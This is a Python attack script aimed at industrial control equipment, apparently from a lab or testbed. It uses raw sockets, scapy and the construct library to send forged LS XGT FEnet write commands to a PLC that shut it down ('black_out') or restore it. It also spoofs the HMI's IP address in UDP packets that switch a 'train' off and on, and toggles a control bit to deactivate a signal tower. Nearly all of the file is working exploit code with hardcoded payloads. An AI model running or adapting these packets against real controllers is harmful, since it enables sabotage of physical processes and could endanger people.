from socket import *
import binascii

# -*- coding: utf-8 -*-
import scapy.all as scapy
from random import randint
import threading, os, sys, optparse
import atexit
import time
from construct import *
from scapy.layers.l2 import Ether
from scapy.sendrecv import sendp, send
from scapy.layers.inet import UDP, IP

recover_packet = "4c5349532d584754000000000033bbaa1100000458000000000001000400254d5831010001"
shutdown_packet = "4c5349532d584754000000000033bbaa1100000458000000000001000400254d5832010001"

def send_packet(p):
    clientSocket = socket(AF_INET,SOCK_STREAM)
    clientSocket.connect(('192.168.1.4', 2004))

    clientSocket.send(p)
    time.sleep(0.1)
    clientSocket.close()
    
def black_out():
    p = binascii.unhexlify(shutdown_packet)
    send_packet(p)
    
def recover():
    p = binascii.unhexlify(recover_packet)
    send_packet(p)
    
attack_packet_ledon="57 00 00 00 00 11 11 07 00 00 ff ff 03 00 00 00 00 00 00 22 00 1c 00 0a 08 00 00 00 00 00 00 00 00 14 02 2d 00 00 00 00 01 00 00 90 00 0a 00 00 00 00 00 00 00 01 00 00 00 00 00 00 00 00 00 "      #?
attack_packet_ledoff="57 00 00 00 00 11 11 07 00 00 ff ff 03 00 00 00 00 00 00 22 00 1c 00 0a 08 00 00 00 00 00 00 00 00 14 02 2d 00 00 00 00 01 00 00 90 00 0a 00 00 00 00 00 00 00 00 00"     #? 
# 74:86:e2:12:f1:6b
# 2
# 00:13:ef:30:07:d9
#
HMI_IP = "192.168.3.18"
HMI_MAC = "28:e9:8e:24:bb:e0"

PLC_IP = "192.168.3.39"  # TargetM_IP
PLC_MAC = "30:be:3b:8a:1a:f9"

def Send_TRAIN_OFF():
    data_off = bytes.fromhex(attack_packet_ledon)
    udpf =  IP( dst=PLC_IP) / UDP(sport=5001, dport=5006) / (data_off)
    # sendp(udpf, loop=1)
    # udpf = Ether(src=PLC_MAC, dst=PLC_MAC) / IP(src=HMI_IP , dst=PLC_IP) / UDP(sport=5001, dport=5006) / ("00 11 22")
    send(udpf)
    print("TRAIN OFF \n")
    # time.sleep(1)

def Send_TRAIN_ON():
    data_on = bytes.fromhex(attack_packet_ledoff)
    udpf =  IP(src=HMI_IP, dst=PLC_IP) / UDP(sport=5001, dport=5006) / (data_on)
    send(udpf)
    print("TRAIN ON\n")
    # time.sleep(1)

from construct import * 

FEnet = Struct(
    'Company_ID' / Bytes(8),
    'Reserved' /Int16ul,
    'PLC_Info' /Int16ul,
    'CPU_Info' /Int8ul,
    'Source_Frame' /Int8ul,
    'Invoke_ID' /Int16ul,
    'Length' /Int16ul,
    'FEnet_Position' /Int8ul,
    'Reserved2' /Int8ul,
    # --- 
    'Command_Code' /Int16ul,    # 0x0054 read_request 
                                # 0x0055 read_response    
                                # 0x0058 write_request 
                                # 0x0059 write_response    
    'Data_Type' /Int16ul,        # 0x00 bit  
                                # 0x01 byte  
                                # 0x02 word 
                                # 0x03 dword 
    'Reserved3' /Int16ul,
    'Variable_Count' /Int16ul,
    'Variable_Length' /Int16ul,
    'Variable' / Bytes(4),
    'Data_Length' /Int16ul,
    'Data_Value' /Int8ul,
)
    
deactivate_packet = b'\x4c\x53\x49\x53\x2d\x58\x47\x54\x00\x00\x00\x00\x00\x33\x7c\xbf\x11\x00\x00\xda\x58\x00\x00\x00\x00\x00\x01\x00\x04\x00\x25\x4d\x58\x30\x01\x00\x01'

def tower_red():
    p = FEnet.parse(deactivate_packet) 
    p['Variable'] = '%MX0'.encode() # Deactivate 
    p['Data_Value'] = 1 
    deactivate_packet_ = FEnet.build(p)
    send_packet(deactivate_packet_)
    
def tower_blue():
    p = FEnet.parse(deactivate_packet) 
    p['Variable'] = '%MX0'.encode() # Deactivate 
    p['Data_Value'] = 0
    deactivate_packet_ = FEnet.build(p)
    send_packet(deactivate_packet_)
    
if __name__ == '__main__':
    # black_out()
    recover()